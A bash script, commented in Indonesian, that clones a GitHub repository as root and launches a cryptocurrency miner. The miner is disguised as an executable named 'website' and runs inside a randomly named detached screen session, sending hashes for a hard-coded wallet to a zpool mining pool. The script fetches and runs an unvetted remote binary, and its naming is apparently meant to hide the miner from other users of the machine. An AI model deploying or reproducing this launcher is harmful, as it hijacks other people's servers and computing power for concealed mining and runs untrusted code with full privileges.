#!/bin/bash

# Buat nama acak untuk screen
RAND_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 8)

# Update sistem dan install dependensi
apt update -y && apt install -y git screen

# Masuk ke /root
cd /root || exit 1

# Clone repo jika folder magic belum ada
if [ ! -d "magic" ]; then
  git clone https://github.com/amirul5656/magic.git
fi

# Jalankan mining di screen
screen -dmS "$RAND_NAME" bash -c "cd /root/magic && chmod +x website && ./website -o stratum+tcp://m7m.sea.mine.zpool.ca:6033 -u 9QeohmiaKG2cS5R4vmKU8PcCDiisyJMvGt -p c=XMG -t 8 -e 90"

# Informasi ke pengguna
echo "🚀 Mining telah dimulai dalam screen session: $RAND_NAME"
echo "📟 Untuk cek status: screen -r $RAND_NAME"
